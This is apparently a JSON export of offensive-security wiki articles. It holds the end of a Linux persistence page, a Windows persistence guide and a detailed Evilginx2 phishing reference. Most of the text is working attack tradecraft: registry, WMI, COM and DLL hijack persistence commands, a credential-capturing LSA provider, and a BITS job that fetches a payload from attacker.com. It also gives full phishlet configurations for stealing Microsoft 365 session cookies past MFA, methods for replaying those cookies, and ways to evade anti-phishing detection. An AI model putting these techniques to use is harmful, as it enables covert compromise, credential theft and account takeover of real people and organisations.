CONFIG_MODULE_SIG= disabled (check /proc/sys/kernel/modules_disabled)\n# Or sign module with system key\n# Hide from lsmod by removing from module list in kernel memory\n```\n\n### Kernel Rootkit Hiding Techniques\n\nOnce a kernel module is loaded:\n\n```\n1. Remove self from module list: list_del_init(&THIS_MODULE->list)\n2. Remove from sysfs: kobject_del(&THIS_MODULE->mkobj.kobj)\n3. Hook sys_getdents64 to hide files starting with magic prefix\n4. Hook sys_kill to respond to magic signal with root shell\n5. Hook network syscalls to hide C2 connection from netstat\n```\n\nThese techniques make the rootkit invisible to all userland tools — only kernel-aware forensics (volatility, memory dump) can detect it.\n\n### XDG Autostart (Desktop Environments)\n\nFor workstations with GNOME/KDE/XFCE (user-level, no root):\n\n```ini\n# ~/.config/autostart/system-tray.desktop\n[Desktop Entry]\nType=Application\nName=System Tray\nHidden=false\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\nExec=/home/user/.local/bin/update.sh\n```\n\nTriggers every time the user logs into their desktop session. Survives reboots. No root required.\n\n### D-Bus Service Persistence\n\nRegister a persistent D-Bus service that starts automatically:\n\n```ini\n# /usr/share/dbus-1/system-services/org.freedesktop.Maintenance.service\n[D-BUS Service]\nName=org.freedesktop.Maintenance\nExec=/usr/lib/system-maintenance-daemon\nUser=root\n```\n\nThe service starts when any process sends a message to this D-Bus name — can be triggered remotely.\n\n### at/batch Job Chaining for Resilience\n\n```bash\n# Self-replicating at job: each execution schedules the next\n# From cron to make it robust:\n# /etc/cron.d/sysupdate:\n# * * * * * root echo \"/opt/.bd &\" | at now + 2 minutes\n\n# at jobs stored in /var/spool/at/ — easy to miss in manual forensics\n# Unlike crontab, at jobs don't persist in a single visible file\n```\n\n### NetworkManager Dispatcher Scripts\n\nRun code whenever a network interface changes state — triggered on VPN connect, DHCP renewal, etc.:\n\n```bash\n# /etc/NetworkManager/dispatcher.d/99-update\n#!/bin/bash\n# $1 = interface name, $2 = action (up/down/dhcp4-change/etc.)\nif [ \"$2\" = \"up\" ]; then\n /opt/.svc/callback.sh &\nfi\nchmod +x /etc/NetworkManager/dispatcher.d/99-update\n```\n\nTriggers on every network state change — very reliable on laptops that connect/disconnect WiFi.", "last_updated": "2026-03-18"}, "windows-persistence": {"slug": "windows-persistence", "title": "Windows Persistence Techniques", "category": "Persistence", "content": "# Windows Persistence Techniques\n\n## ◈ BEGINNER\n\n### What is Persistence?\n\nPersistence means making sure you can get back into a compromised machine even after it reboots, you get disconnected, or the user logs out. Without persistence, losing your network connection means losing your access entirely.\n\n**Why does persistence matter in real engagements?**\nRed team engagements often run for weeks. Incident responders may kill your active connection. The target machine reboots during updates. Persistence ensures your access survives these interruptions and that defenders need to find and remove every persistence mechanism — not just disconnect your current session.\n\n**Key terms:**\n- **Registry Run keys** — Windows registry entries that automatically launch programs at login\n- **Scheduled task** — a task Windows automatically runs at a specified time or event\n- **Windows service** — a background process that starts automatically with Windows\n- **WMI subscription** — a Windows Management Instrumentation mechanism that executes code in response to system events (fileless persistence)\n- **DLL hijacking** — tricking a legitimate application into loading your malicious DLL instead of the real one\n- **COM hijacking** — registering a fake COM object in user-controlled registry (HKCU) that overrides the system one (HKLM)\n\n**Defense evasion principles for persistence:**\n- Name your files and tasks to look legitimate (`WindowsUpdate`, `SystemMaintenance`)\n- Use techniques with low detection rates (COM hijacking, DLL side-loading)\n- Place files in legitimate-looking locations (`C:\\Windows\\System32`, `%APPDATA%`)\n- Layer multiple persistence mechanisms — if one is found, others remain\n\n**Analogy:** Persistence is like hiding spare keys around a building. The front door key (active session) might get taken away, but if you've hidden copies under the mat, in the mailbox, and with a neighbor, you can always get back in.\n\n## ◈ INTERMEDIATE\n\nMaintaining access to compromised Windows systems across reboots, user logoffs, and service restarts.\n\n## Registry Run Keys\n\nThe most common persistence mechanism — execute a payload at user logon:\n\n```cmd\n:: Per-user (no admin required)\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\Users\\user\\AppData\\payload.exe\" /f\n\n:: Machine-wide (requires admin)\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\ProgramData\\payload.exe\" /f\n\n:: RunOnce (executes once, then deleted)\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"Setup\" /t REG_SZ /d \"payload.exe\" /f\n```\n\n**Detection**: Autoruns, Sysmon Event 13 (registry value set), EDR registry monitoring. Very well-known — use only when stealth is not critical.\n\n## Scheduled Tasks\n\n```cmd\n:: Create task running as SYSTEM at logon\nschtasks /create /tn \"WindowsUpdate\" /tr \"C:\\ProgramData\\update.exe\" /sc onlogon /ru SYSTEM /f\n\n:: Trigger every 15 minutes\nschtasks /create /tn \"Maintenance\" /tr \"C:\\ProgramData\\svc.exe\" /sc minute /mo 15 /ru SYSTEM /f\n```\n\n**Detection**: Event 4698 (task created), Sysmon Event 1 with parent `svchost.exe -k netsvcs -p -s Schedule`.\n\n## Windows Services\n\n```cmd\n:: Install as service\nsc create \"WindowsUpdateSvc\" binPath= \"C:\\ProgramData\\svc.exe\" start= auto DisplayName= \"Windows Update Service\"\nsc description \"WindowsUpdateSvc\" \"Manages Windows Update operations\"\n\n:: Using NSSM for non-service executables\nnssm install MyService C:\\ProgramData\\payload.exe\n```\n\n**Detection**: Event 7045 (new service installed), Event 4697. Services are heavily monitored.\n\n## WMI Event Subscriptions\n\nFileless persistence via permanent WMI consumers:\n\n```powershell\n# Event filter (trigger condition)\n$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n Name = \"UpdateFilter\"\n EventNamespace = \"root\\cimv2\"\n QueryLanguage = \"WQL\"\n Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n}\n\n# Consumer (action to take)\n$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n Name = \"UpdateConsumer\"\n CommandLineTemplate = \"C:\\ProgramData\\payload.exe\"\n}\n\n# Binding (connect trigger to action)\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{\n Filter = $filter; Consumer = $consumer\n}\n```\n\n**Detection**: WMI repository forensics, Sysmon Event 19/20/21 (WMI events). Harder to detect than registry/services.\n\n## DLL Hijacking / Side-Loading\n\nPlace a malicious DLL in the search path of a legitimate application:\n\n1. Identify target application with Process Monitor (look for DLL NOT FOUND results)\n2. Create DLL that proxies calls to the legitimate DLL while executing payload\n3. Place in application directory (searched before system directories)\n\n**DLL Proxying**: Forward all exported functions to the real DLL while adding malicious code in DllMain. Tools: **SharpDLLProxy**, **DLLirant**.\n\n## COM Object Hijacking\n\nHKCU COM registrations override HKLM, allowing unprivileged persistence:\n\n```cmd\n:: Hijack a COM object loaded by Explorer or other processes\nreg add \"HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InProcServer32\" /ve /t REG_SZ /d \"C:\\Users\\user\\evil.dll\" /f\nreg add \"HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InProcServer32\" /v \"ThreadingModel\" /t REG_SZ /d \"Both\" /f\n```\n\nFind target CLSIDs by monitoring Explorer.exe COM loads with Process Monitor.\n\n## Accessibility Features Backdoor\n\nReplace accessibility binaries invoked from the login screen (requires SYSTEM):\n\n```cmd\n:: Image File Execution Options debugger — more subtle than file replacement\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f\n\n:: Targets: sethc.exe (Sticky Keys), utilman.exe (Utility Manager), osk.exe (On-Screen Keyboard)\n:: Trigger from login screen: press Shift 5 times, or Win+U\n```\n\n## BITS Jobs\n\nBackground Intelligent Transfer Service for persistent download-and-execute:\n\n```cmd\nbitsadmin /create /download persistence\nbitsadmin /addfile persistence http://attacker.com/payload.exe C:\\ProgramData\\update.exe\nbitsadmin /SetNotifyCmdLine persistence C:\\ProgramData\\update.exe NUL\nbitsadmin /resume persistence\n```\n\nBITS jobs survive reboots and are less commonly monitored than registry/services.\n\n## OpSec Comparison\n\n| Technique | Stealth | Survives Reboot | Admin Required | Detection Difficulty |\n|-----------|---------|-----------------|----------------|---------------------|\n| Registry Run | Low | Yes | No (HKCU) | Easy |\n| Scheduled Task | Low | Yes | No (user) | Easy |\n| WMI Subscription | Medium | Yes | Yes | Medium |\n| COM Hijack | High | Yes | No | Hard |\n| DLL Side-Load | High | Yes | Depends | Hard |\n| Print Monitor | High | Yes | Yes | Hard |\n| BITS Job | Medium | Yes | No | Medium |\n\n## ◈ ADVANCED\n\n### Time Provider DLL\n\nThe Windows Time service (W32Time) loads Time Provider DLLs — loaded by a system service running as LOCAL SYSTEM:\n\n```\nRegistry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\\nAdd key: CustomProvider\n DllName = C:\\Windows\\System32\\malicious.dll\n Enabled = 1\n\nThe DLL must export: TimeProvOpen, TimeProvCommand, TimeProvClose\nThese can be stub functions — the DllMain is what executes your payload\n\nTrigger: sc stop w32time && sc start w32time (or reboot)\nDetection difficulty: High — Time service DLL loading is rarely audited\n```\n\n### Netsh Helper DLL\n\n```cmd\n:: Netsh loads helper DLLs — add malicious one\n:: Requires local admin\nreg add \"HKLM\\SOFTWARE\\Microsoft\\NetSh\" /v \"MalHelper\" /t REG_SZ /d \"C:\\Windows\\Temp\\helper.dll\"\n\n:: Triggers when netsh.exe is run (common in network diagnostics, troubleshooting scripts)\n:: DLL must export InitHelperDll()\n:: Extremely rare location for detection rules\n```\n\n### Screensaver Persistence (User-Level)\n\n```powershell\n# Screensaver is an executable (.scr = renamed .exe) launched by winlogon.exe\n# Runs as current user after workstation idle timeout\nreg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"C:\\Windows\\Temp\\payload.scr\"\nreg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d \"1\"\nreg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d \"60\"\n# Trigger: leave workstation idle 60 seconds\n```\n\n### LSA Security Support Provider\n\nRegister a custom SSP that captures plaintext credentials at logon — every password typed at the Windows login screen is passed to registered SSPs:\n\n```cmd\n:: Mimikatz in-memory SSP (logs to C:\\Windows\\System32\\mimilsa.log)\nmisc::memssp\n\n:: Persistent SSP via registry (survives reboots, captures all logon creds)\n:: Add mimilib.dll to Security Packages value\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" /t REG_MULTI_SZ /d \"mimilib\" /f\n:: Place mimilib.dll in System32\n```\n\n### Boot/Pre-OS Persistence (Bootkit)\n\nFor the most persistent footholds that survive OS reinstalls:\n\n```\nMBR/VBR infection:\n- Patch Master Boot Record to load rootkit before OS\n- VBR (Volume Boot Record) modification — loads during early boot\n- UEFI implant — survives disk replacement (stored in UEFI firmware)\n\nModern approach (2026): UEFI rootkits\n- CosmicStrand, MosaicRegressor, BlackLotus\n- Stored in SPI flash on motherboard\n- Bypasses Secure Boot via UEFI vulnerability exploitation\n- Survives OS reinstall, disk replacement, and CMOS reset\n- Detection requires firmware integrity checking (not common)\n```\n\n### AppCertDLLs and AppInit_DLLs\n\n```cmd\n:: AppCertDLLs — loaded into processes that call CreateProcess/CreateThread\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs\" /v \"CertHelper\" /t REG_SZ /d \"C:\\Windows\\System32\\malicious.dll\" /f\n\n:: AppInit_DLLs — loaded into every process that loads user32.dll\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"C:\\ProgramData\\evil.dll\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f\n:: Note: Disabled by default on Windows 8+ with Secure Boot enabled\n```\n\n### Active Setup for All-User Persistence\n\nActive Setup runs commands once per user at first logon — including new users added after compromise:\n\n```cmd\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{GUID}\" /v StubPath /t REG_SZ /d \"C:\\ProgramData\\payload.exe\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{GUID}\" /v Version /t REG_SZ /d \"1,0,0,0\" /f\n```\n\nEvery new user who logs in triggers the payload — valuable for persistent access after account creation.", "last_updated": "2026-03-18"}, "evilginx2-phishlets": {"slug": "evilginx2-phishlets", "title": "Evilginx2 Phishlets", "category": "Phishing", "content": "# Evilginx2 Phishlets — Complete Reference\n\n## ◈ BEGINNER\n\n### What Is Evilginx2 and Why Does It Matter?\n\n**Evilginx2** is a man-in-the-middle phishing framework that defeats multi-factor authentication by acting as a transparent proxy between the victim and the real website. Unlike a static clone that captures only usernames and passwords, Evilginx2 proxies the victim through the actual authentication service — including MFA — and captures the resulting authenticated session cookies.\n\n**Why MFA doesn't stop it:** When you complete MFA on a real site through Evilginx's proxy, the real authentication server issues a valid session cookie. Evilginx captures that cookie. The attacker now has full access to your account without knowing your password or MFA device.\n\n**Key terms:**\n- **Evilginx2** — the proxy framework; written in Go; maintains its own TLS certificates and DNS; proxies traffic between victim and real site\n- **Phishlet** — a YAML configuration file that tells Evilginx2 which domains to proxy, which cookies to capture, and what credential fields to intercept; one phishlet per target service (Microsoft, Google, Okta, etc.)\n- **Lure** — the unique phishing URL generated by Evilginx for each campaign; contains a token that tracks which victim visited\n- **auth_tokens** — the cookies defined in the phishlet that signal a successful authentication; Evilginx watches for these and captures them\n- **sub_filters** — phishlet instructions to rewrite real domain names in HTML/JS responses to attacker domain names so the proxied page links work correctly\n- **session replay** — using captured cookies in an attacker's browser to authenticate as the victim without knowing their password\n- **AiTM (Adversary-in-the-Middle)** — the broader attack category; Evilginx2 is the most common tool for web-based AiTM\n- **Let's Encrypt** — Evilginx provisions TLS certificates automatically; the phishing domain gets a real HTTPS certificate\n- **ESTSAUTH** — the Microsoft O365 session cookie Evilginx2 captures; once obtained, provides full O365 access bypassing MFA\n\n**How the attack works:**\n```\n1. Attacker sets up Evilginx2 on a VPS with a lookalike domain\n2. Phishlet configured for the target (e.g., Microsoft O365)\n3. Lure URL sent to victim via phishing email\n4. Victim visits lure URL → Evilginx proxies them to real Microsoft login\n5. Victim enters credentials AND completes MFA on the real Microsoft site\n6. Microsoft issues authenticated session cookie → Evilginx captures it\n7. Victim is redirected to real Office portal (appears nothing went wrong)\n8. Attacker imports captured cookies → full access to victim's M365 account\n```\n\n**Analogy:** Evilginx2 is like a toll booth on the road to a bank. You drive through normally — show your ID, enter your PIN — the toll booth lets you pass. But the toll booth operator photographed your ID and recorded your PIN. You arrive at the bank having done everything right, but now someone else also has everything they need to impersonate you.\n\n## ◈ INTERMEDIATE\n\nEvilginx2 is a man-in-the-middle attack framework that proxies traffic between victim and the real authentication service, capturing session cookies after MFA completion. Unlike static clones, it provides full transparency to the victim — they interact with the real site through Evilginx's proxy.\n\n## Architecture\n\n```\nVictim Browser ──HTTPS──> Evilginx2 (VPS) ──HTTPS──> Real Site (Microsoft/Google/etc)\n │\n Captures cookies\n Captures credentials\n Serves phishlet-defined modified responses\n```\n\nEvilginx terminates TLS for the phishing domain, proxies to the real domain, rewrites host headers and response bodies (per phishlet sub_filters), and captures auth cookies when they match phishlet `auth_tokens` patterns.\n\n## Infrastructure Requirements\n\n```bash\n# VPS: Ubuntu 22.04 minimum\n# Ports open: 53 (DNS), 80 (HTTP→HTTPS redirect), 443 (HTTPS phishing)\n# DNS records (at registrar):\n# A login.attacker.io → VPS_IP\n# A *.attacker.io → VPS_IP (wildcard for phishlet subdomains)\n# Note: Do NOT use Cloudflare proxy (orange cloud) — Evilginx serves its own TLS\n\n# Install Go 1.21+\nwget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz\ntar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz\nexport PATH=$PATH:/usr/local/go/bin\n\n# Install Evilginx2\ngit clone https://github.com/kgretzky/evilginx2 && cd evilginx2\nmake\n\n# Or install binary\nwget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.tar.gz\n```\n\n## Evilginx2 Console\n\n```bash\n# Start (must run as root — binds ports 53, 80, 443)\nsudo ./evilginx2 -p ./phishlets/ -developer\n\n# Production (no -developer: enables Let's Encrypt cert provisioning)\nsudo ./evilginx2 -p ./phishlets/\n\n# Core configuration\nconfig domain attacker.io # base domain\nconfig ipv4 45.77.X.X # your VPS IP\nconfig unauth_url https://google.com # where unauthenticated visitors go\n\n# Phishlet management\nphishlets # list available phishlets\nphishlets hostname o365 attacker.io # set hostname for phishlet\nphishlets enable o365 # enable (triggers Let's Encrypt cert request)\nphishlets disable o365\n\n# Lure management\nlures create o365 # create a lure for o365 phishlet\nlures get-url 0 # get phishing URL for lure 0\nlures # list all lures\nlures edit 0 redirect_url https://portal.office.com # set post-capture redirect\nlures edit 0 og_title \"Microsoft Security Alert\" # OpenGraph title for link previews\nlures edit 0 og_description \"Verify your account access\"\n\n# Session/credential management\nsessions # list captured sessions\nsessions 1 # show details (cookies, credentials)\nsessions delete 1\n\n# Blacklist management (block scanners)\nblacklist # list blacklisted IPs\nblacklist add 1.2.3.4\n```\n\n## Phishlet YAML Structure — Complete Reference\n\n```yaml\nname: 'office365'\nauthor: 'operator'\nmin_ver: '3.0.0'\n\n# Proxy host mappings: phish_sub.base_domain → orig_sub.domain\nproxy_hosts:\n - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com',\n session: true, is_landing: true, auto_filter: true}\n - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com',\n session: false, is_landing: false, auto_filter: false}\n - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com',\n session: false, is_landing: false, auto_filter: false}\n\n# Response body rewrites: replace real domains with phishing domains in responses\nsub_filters:\n - {triggers_on: 'login.microsoftonline.com',\n orig_sub: 'login', domain: 'microsoftonline.com',\n search: 'login\\.microsoftonline\\.com',\n replace: 'login.attacker.io',\n mimes: ['text/html', 'application/json', 'application/javascript']}\n - {triggers_on: 'account.microsoft.com',\n orig_sub: 'account', domain: 'microsoft.com',\n search: 'account\\.microsoft\\.com',\n replace: 'account.attacker.io',\n mimes: ['text/html', 'application/javascript']}\n\n# Cookies to capture — defines capture completion trigger\nauth_tokens:\n - domain: '.microsoftonline.com'\n keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid', 'esctx', 'x-ms-gateway-slice']\n - domain: '.microsoft.com'\n keys: ['MC1', 'MSFPC', 'SDIDC']\n - domain: '.office.com'\n keys: ['PrivacyConsent']\n\n# Credential field capture from POST bodies\ncredentials:\n username:\n key: 'login'\n search: '(.*)'\n type: 'post'\n password:\n key: 'passwd'\n search: '(.*)'\n type: 'post'\n\n# Landing page (where victim is directed when they visit lure URL)\nlogin:\n domain: 'login.microsoftonline.com'\n path: '/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_type=id_token&scope=openid%20profile&response_mode=form_post&nonce=nonce'\n\n# Force cookie setting for session persistence\nforce_post:\n - path: '/common/login'\n search: 'login'\n force: 'sso=1'\n```\n\n## Pre-Built Phishlets\n\nThe Evilginx2 community maintains phishlets for common targets:\n\n| Target | Captures | Complexity |\n|--------|----------|------------|\n| O365 (Microsoft) | ESTSAUTH, ESTSAUTHPERSISTENT — bypass MFA | High (frequent updates) |\n| Google Workspace | SID, HSID, SSID, APISID cookies | High |\n| Okta | sid cookie | Medium |\n| GitHub | user_session, logged_in | Medium |\n| LinkedIn | li_at cookie | Low |\n| Dropbox | gvc, t cookies | Low |\n| AWS Console | aws-creds, AWSALBAUTH | High |\n| Cloudflare Dashboard | CF_Authorization | Medium |\n\nCommunity phishlets: github.com/An0nUD4Y/Evilginx2-Phishlets, github.com/hash3liZer/phishlets\n\n## Building a New Phishlet\n\n### Step 1: Map the Authentication Flow\n\n```bash\n# Use browser DevTools Network tab, filter by domain\n# Navigate through login flow; record:\n# 1. All domains involved (login page, OAuth, MFA, redirect)\n# 2. POST body fields for username/password\n# 3. Final cookies set after successful auth\n# 4. Redirects and callback URLs\n\n# Useful: mitmproxy to intercept and inspect\nmitmproxy --mode regular --listen-port 8080\n# Browse via proxy; export HAR for analysis\n```\n\n### Step 2: Identify Auth Cookies\n\n```javascript\n// In browser console after successful auth:\ndocument.cookie.split(';').map(c => c.trim())\n\n// Or check Application > Cookies in DevTools\n// Target: cookies that survive tab close (persistent)\n// These are the ones Evilginx needs to capture for session replay\n```\n\n### Step 3: Minimal Phishlet Template\n\n```yaml\nname: 'target-app'\nauthor: 'operator'\nmin_ver: '3.0.0'\n\nproxy_hosts:\n - {phish_sub: 'auth', orig_sub: 'auth', domain: 'target.com',\n session: true, is_landing: true, auto_filter: true}\n\nsub_filters:\n - {triggers_on: 'auth.target.com',\n orig_sub: 'auth', domain: 'target.com',\n search: 'auth\\.target\\.com',\n replace: 'auth.attacker.io',\n mimes: ['text/html', 'application/javascript', 'application/json']}\n\nauth_tokens:\n - domain: '.target.com'\n keys: ['session_token', 'auth_cookie']\n\ncredentials:\n username:\n key: 'username' # POST body field name\n search: '(.*)'\n type: 'post'\n password:\n key: 'password'\n search: '(.*)'\n type: 'post'\n\nlogin:\n domain: 'auth.target.com'\n path: '/login'\n```\n\n### Step 4: Debug Mode Testing\n\n```bash\n# Start in developer mode (self-signed certs, no LE)\nsudo ./evilginx2 -p phishlets/ -developer\n\n# Enable verbose logging\nconfig debug true\n\n# Test with local /etc/hosts override\necho \"127.0.0.1 auth.attacker.io\" >> /etc/hosts\n\n# Watch Evilginx logs for:\n# - \"proxy: request → target\" (proxying correctly)\n# - \"auth_token captured\" (tokens being extracted)\n# - sub_filter rewrites happening in responses\n```\n\n## Session Token Replay\n\nAfter Evilginx captures session cookies:\n\n### Method 1: EditThisCookie Browser Extension\n1. Open browser, navigate to real site (logout first)\n2. Open EditThisCookie\n3. Import JSON array of captured cookies from Evilginx `sessions ` output\n4. Refresh — you are now authenticated as victim\n\n### Method 2: Cookie-Editor or DevTools\n```javascript\n// In browser console, set each captured cookie:\ndocument.cookie = \"ESTSAUTH=VALUE; domain=.microsoftonline.com; path=/; secure\";\n// Repeat for each auth_token captured\n```\n\n### Method 3: cURL / API Access (M365 example)\n```bash\n# Extract Bearer token from captured session (O365)\n# Evilginx captures OAuth tokens in some flows\n\n# Access Microsoft Graph with captured token\ncurl -H \"Authorization: Bearer CAPTURED_ACCESS_TOKEN\" \\\n \"https://graph.microsoft.com/v1.0/me\"\n\ncurl -H \"Authorization: Bearer CAPTURED_ACCESS_TOKEN\" \\\n \"https://graph.microsoft.com/v1.0/me/messages?\\$top=10\"\n\n# Use captured cookies with curl\ncurl -b \"ESTSAUTH=VALUE; ESTSAUTHPERSISTENT=VALUE\" \\\n \"https://portal.office.com\"\n```\n\n### Method 4: Playwright/Puppeteer Automation\n```python\nfrom playwright.sync_api import sync_playwright\n\nwith sync_playwright() as p:\n browser = p.chromium.launch()\n ctx = browser.new_context()\n # Import captured cookies\n ctx.add_cookies([\n {\"name\": \"ESTSAUTH\", \"value\": \"CAPTURED\", \"domain\": \".microsoftonline.com\", \"path\": \"/\"},\n {\"name\": \"ESTSAUTHPERSISTENT\", \"value\": \"CAPTURED\", \"domain\": \".microsoftonline.com\", \"path\": \"/\"},\n ])\n page = ctx.new_page()\n page.goto(\"https://portal.office.com\")\n # Now authenticated\n```\n\n## Evilginx + GoPhish Integration\n\nCombine tracking (GoPhish) with MFA bypass (Evilginx):\n\n```bash\n# GoPhish email template uses Evilginx lure URL instead of GoPhish landing page\n# Victim clicks → GoPhish tracks click → redirected to Evilginx lure URL\n# Evilginx proxies real site → captures session cookies\n\n# In GoPhish template URL: {{.URL}} points to Evilginx lure\n# Evilginx lure redirect_url: https://portal.office.com (after capture)\n\n# Track which victim authenticated via custom Evilginx lure per target\nlures create o365\nlures edit 0 redirect_url https://portal.office.com\n# Give unique lure URL per GoPhish target for attribution\n```\n\n## Detection and Evasion\n\n### Known Detection Methods\n- Evilginx's default certificate uses LE with `evilginx` in CN (rotate domain regularly)\n- Cloudflare categorizes Evilginx infrastructure quickly — use uncategorized domains\n- Microsoft Defender SmartScreen flags known phishing domains — domain must be fresh + aged\n- Network-level: unusual TLS cert for claimed domain (cert mismatch on proxy_host)\n- Browser: URL bar shows attacker domain not microsoft.com — requires good typosquatting\n\n### Evasion Improvements\n```bash\n# Use Evilginx with legitimate-looking domain\nconfig domain office-secure-login.io # not attacker.io\n\n# Custom certificate (not Let's Encrypt with obvious pattern)\n# Import wildcard cert from DigiCert/Sectigo purchase\n\n# Hide Evilginx behind Nginx with rate limiting\n# Only pass requests that match expected user-agent or referrer\n\n# Evilginx blacklist mode: auto-block known scanner IPs\nblacklist unauth # redirect unauthorized to benign site\n```\n\n## Modlishka Alternative\n\nModlishka is a single-binary reverse proxy phishing framework, simpler than Evilginx:\n\n```bash\ngit clone https://github.com/drk1wi/Modlishka && cd Modlishka\ngo build -o modlishka main.go\n\n./modlishka \\\n -proxyDomain \"attacker.io\" \\\n -target \"login.microsoftonline.com\" \\\n -cert /path/to/cert.pem \\\n -certKey /path/to/key.pem \\\n -credParams \"login:passwd\" # POST field names for credential capture\n```\n\nModlishka lacks phishlet concept — all config via flags. Better for quick one-off deployments; Evilginx2 for complex multi-domain auth flows.\n\n## ◈ ADVANCED\n\n### Phishlet Hardening — Defeating Modern Anti-Phishing Controls\n\nMicrosoft and Google have deployed server-side AiTM detection that looks for telltale signs of proxy-based phishing:\n\n**Known Evilginx2 fingerprints:**\n- Response timing: proxied responses have additional latency; detection looks for consistent 50–150ms overhead on all requests\n- Header injection: Evilginx adds/modifies certain headers; baseline deviation detectable\n- Cookie domain mismatch: auth cookies issued with `.microsoftonline.com` domain served from a different TLD\n- TLS fingerprint (JA3): Evilginx's Go HTTP client has a specific JA3 fingerprint different from browser TLS\n\n**Evasion hardening:**\n```bash\n# 1. Use uTLS to mimic Chrome TLS fingerprint in Evilginx's HTTP client\n# Fork Evilginx2 to use uTLS library instead of standard Go crypto/tls\n# JA3 of patched version matches Chrome exactly\n\n# 2. Deploy Nginx in front of Evilginx to handle TLS termination\n# Nginx presents browser-matching TLS, forwards to Evilginx on localhost\n# Evilginx never terminates TLS — Nginx does it cleanly\n\n# 3. IP-based filtering before Evilginx receives traffic\n# Block: Microsoft/Google scanner IPs, known AV/sandbox ranges, datacenter ASNs\n# Only serve phishlet to residential ISP IP ranges in target country\n\n# 4. Custom HSTS headers: strip HSTS to prevent browser-enforced HTTPS upgrades\n# that could break proxy for subdomains\n```\n\n### Token Post-Processing Pipeline\n\nAfter Evilginx captures tokens, automate exploitation:\n\n```python\n# Webhook listener that receives Evilginx captured sessions\n# Evilginx v3+ supports webhook callbacks on session capture\n\n# Auto-trigger on new session:\n# 1. Validate token freshness (ESTSAUTH typically 24hr lifetime)\n# 2. Auto-enumerate M365 tenant with captured token\n# 3. Check for admin roles (Global Admin, Exchange Admin)\n# 4. Dump email inbox metadata (Graph API)\n# 5. Enumerate SharePoint sites accessible to victim\n# 6. If high-value account: immediately register persistent OAuth app\n\n# Register OAuth app for persistence (survives password reset):\n# POST https://graph.microsoft.com/v1.0/applications\n# with captured Bearer token - creates app with target permissions\n# Exchange code for refresh token with 90-day lifetime\n```\n\n### Multi-Phishlet Campaign Architecture\n\nFor large-scale engagements targeting multiple services:\n\n```\nArchitecture:\n GoPhish (tracking) → per-victim unique lure URL\n ↓\n Nginx (routing) → route by subdomain\n ├─ login.attacker.io → Evilginx Instance A (O365 phishlet)\n ├─ accounts.attacker.io → Evilginx Instance B (Google phishlet)\n └─ auth.attacker.io → Evilginx Instance C (Okta phishlet)\n\nBenefits:\n- Isolate failures: one phishlet breaking doesn't affect others\n- Per-service opsec: different VPS IPs for different services\n- Independent TLS cert lifecycle\n- Separate session databases\n```\n\n### Evilginx3 Enhancements (2025+)\n\nEvilginx v3 introduced significant improvements:\n- **Webhook support**: POST to attacker-controlled endpoint on every session capture with full JSON cookie dump — enables real-time automation\n- **Lure path customization**: set arbitrary URL paths for lures to match legitimate-looking patterns (`/sso/login`, `/auth/redirect`)\n- **Phishlet marketplace**: community-maintained phishlets with version pinning\n- **Blacklist automation**: automatic blocking of requests matching scanner UA patterns\n\n### Phishlet Development for Custom SaaS Applications\n\nFor proprietary enterprise SaaS (custom ERP, internal portals):\n\n```\nStep-by-step for undocumented targets:\n1. Configure Burp Suite as transparent proxy\n2. Authenticate through Burp; capture complete auth flow HAR\n3. Identify all cookie domains using HAR analysis:\n jq '[.log.entries[] | {url: .request.url, cookies: .response.cookies[].name}]' auth.har\n4. Find the \"auth boundary\" cookie: the one set last that unlocks subsequent requests\n5. Build minimal phishlet with single proxy_host, single auth_token\n6. Test with evilginx2 -developer flag; check logs for token capture confirmation\n7. Add sub_filters for any JS/HTML containing the real domain\n8. Iterate: test authenticated requests with captured token to confirm replay works\n```\n\n**Troubleshooting common phishlet failures:**\n- Token not captured: wrong cookie name or domain in auth_tokens — check exact cookie domain with leading dot\n- Page renders broken: missing sub_filter for a JS module that references absolute domain URLs\n- Redirect loop: force_post entry needed for session cookie injection on login endpoint\n- CORS errors: add sub_filter to rewrite Access-Control-Allow-Origin headers in responses", "last_updated": "2026-03-18"}, "phishing-overview": {"slug": "phishing-overview", "title": "Phishing Overview", "category": "Phishing", "content": 